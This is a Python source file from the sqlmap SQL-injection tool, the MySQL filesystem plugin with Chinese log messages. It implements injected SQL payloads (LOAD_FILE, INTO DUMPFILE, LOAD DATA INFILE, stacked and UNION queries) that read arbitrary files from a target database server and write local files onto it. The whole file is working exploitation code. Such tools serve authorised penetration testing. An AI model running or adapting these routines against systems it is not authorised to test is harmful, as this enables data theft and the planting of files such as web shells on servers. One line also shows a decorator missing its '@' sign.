#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import getSQLSnippet
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import SqlmapNoneDataException
from lib.request import inject
from lib.request.connect import Connect as Request
from lib.techniques.union.use import unionUse
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def nonStackedReadFile(self, rFile):
        if not kb.bruteMode:
            infoMsg = "获取文件: '%s'" % rFile
            logger.info(infoMsg)

        result = inject.getValue("HEX(LOAD_FILE('%s'))" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "获取文件: '%s'" % remoteFile
            logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
        self.getRemoteTempPath()

        tmpFile = "%s/tmpf%s" % (conf.tmpPath, randomStr(lowercase=True))

        debugMsg = "将文件 '%s' 的十六进制编码内容保存到临时文件 '%s'" % (remoteFile, tmpFile)
        logger.debug(debugMsg)
        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (remoteFile, tmpFile))

        debugMsg = "将十六进制编码文件 '%s' 的内容加载到支持表中" % remoteFile
        logger.debug(debugMsg)
        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))

        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        if not isNumPosStrValue(length):
            warnMsg = "无法检索文件 '%s' 的内容" % remoteFile

            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                if not kb.bruteMode:
                    warnMsg += ", 将回退到更简单的 UNION 技术"
                    logger.warning(warnMsg)
                result = self.nonStackedReadFile(remoteFile)
            else:
                raise SqlmapNoneDataException(warnMsg)
        else:
            length = int(length)
            chunkSize = 1024

            if length > chunkSize:
                result = []

                for i in xrange(1, length, chunkSize):
                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, chunkSize, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                    result.append(chunk)
            else:
                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    stackedmethod
    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("将文件编码为十六进制字符串")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "由于注入点在 GET 参数上,要写入的文件的十六进制值为 %d 字节,这可能导致文件写入过程中出错" % fcEncodedStrLen
            logger.warning(warnMsg)

        debugMsg = "将 %s 文件内容导出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        pushValue(kb.forceWhere)
        kb.forceWhere = PAYLOAD.WHERE.NEGATIVE
        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, remoteFile)
        unionUse(sqlQuery, unpack=False)
        kb.forceWhere = popValue()

        warnMsg = "请注意文件中可能有残留的垃圾字符,这是 UNION 查询的剩余部分"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def linesTerminatedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("将文件编码为十六进制字符串")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "由于注入点在 GET 参数上,要写入的文件的十六进制值为 %d 字节,这可能导致文件写入过程中出错" % fcEncodedStrLen
            logger.warning(warnMsg)

        debugMsg = "将 %s 文件内容导出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        query = getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=remoteFile, HEXSTRING=fcEncodedStr)
        query = agent.prefixQuery(query)        # 注意:不需要后缀,因为 'write_file_limit' 已经以注释结尾(必需)
        payload = agent.payload(newValue=query)
        Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)

        warnMsg = "请注意文件中可能有残留的垃圾字符,这是原始查询的剩余部分"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        debugMsg = "创建一个支持表以写入十六进制编码的文件"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug("将文件编码为十六进制字符串")
        fcEncodedList = self.fileEncode(localFile, "hex", False)

        debugMsg = "构造 SQL 语句以将十六进制编码的文件写入支持表"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("将十六进制编码的文件插入支持表")

        inject.goStacked("SET GLOBAL max_allowed_packet = %d" % (1024 * 1024))  # 1MB(注意:https://github.com/sqlmapproject/sqlmap/issues/3230)

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = "将 %s 文件内容导出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # 参考:http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, remoteFile), silent=True)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)